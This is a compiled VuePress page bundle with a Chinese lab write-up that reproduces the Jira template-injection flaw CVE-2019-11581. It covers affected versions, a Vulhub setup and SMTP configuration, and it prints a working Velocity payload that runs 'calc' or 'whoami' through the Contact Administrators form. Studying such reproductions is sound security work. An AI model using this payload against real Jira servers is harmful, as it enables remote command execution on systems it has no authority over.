import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as n,c as o,a as e,b as i,d as t,e as s}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p=e("p",null,"Atlassian Jira是企业广泛使用的项目与事务跟踪工具，被广泛应用于缺陷跟踪、客户服务、需求收集、流程审批、任务跟踪、项目跟踪和敏捷管理等工作领域。",-1),u=e("p",null,"参考资料：",-1),h={href:"https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html",target:"_blank",rel:"noopener noreferrer"},g={href:"https://jira.atlassian.com/browse/JRASERVER-69532",target:"_blank",rel:"noopener noreferrer"},x={href:"https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw",target:"_blank",rel:"noopener noreferrer"},f=s(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>多个版本前存在利用模板注入执行任意命令：</p><ul><li>4.4.x</li><li>5.x.x</li><li>6.x.x</li><li>7.0.x</li><li>7.1.x</li><li>7.2.x</li><li>7.3.x</li><li>7.4.x</li><li>7.5.x</li><li>7.6.x before 7.6.14 (the fixed version for 7.6.x)</li><li>7.7.x</li><li>7.8.x</li><li>7.9.x</li><li>7.10.x</li><li>7.11.x</li><li>7.12.x</li><li>7.13.x before 7.13.5 (the fixed version for 7.13.x)</li><li>8.0.x before 8.0.3 (the fixed version for 8.0.x)</li><li>8.1.x before 8.1.2 (the fixed version for 8.1.x)</li><li>8.2.x before 8.2.3 (the fixed version for 8.2.x)</li></ul><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Jira Server 8.1.0：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>会进入安装引导，切换“中文”，VPS条件下选择“将其设置为我”（第一项）去Atlassian官方申请一个Jira Server的测试证书（不要选择Data Center和Addons）：</p><p>然后继续安装即可。这一步小内存VPS可能安装失败或时间较长（建议使用4G内存以上的机器进行安装与测试），请耐心等待。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/7.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>添加 SMTP 电邮服务器 <code>/secure/admin/AddSmtpMailServer!default.jspa</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/8.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入系统设置 <code>/secure/admin/ViewApplicationProperties.jspa</code> ，开启“联系管理员表单”</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/9.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>貌似还要有项目才能玩，所以随便创建一个示例就行了,然后你就可以愉快的玩耍了</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>PoC 和 CVE-2019-3396 一样</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;, null).invoke(null, null).exec(&#39;calc&#39;).toString()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Linux 没有 calc, 所以</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;, null).invoke(null, null).exec(&#39;whoami&#39;).toString()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>运行<code>poc.py</code>或者进入<code>/secure/ContactAdministrators!default.jspa</code> 直接提交 PoC</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/11.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/12.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果没看到 smtpd 有数据，那么就可能卡队列了</p><p>电邮队列瞅一瞅 <code>/secure/admin/MailQueueAdmin!default.jspa</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/13.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,25);function m(b,_){const a=r("ExternalLinkIcon");return n(),o("div",null,[c,p,u,e("ul",null,[e("li",null,[e("a",h,[i("https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html"),t(a)])]),e("li",null,[e("a",g,[i("https://jira.atlassian.com/browse/JRASERVER-69532"),t(a)])]),e("li",null,[e("a",x,[i("https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw"),t(a)])])]),f])}const y=l(d,[["render",m],["__file","Atlassian Jira 模板注入漏洞 CVE-2019-11581.html.vue"]]);export{y as default};
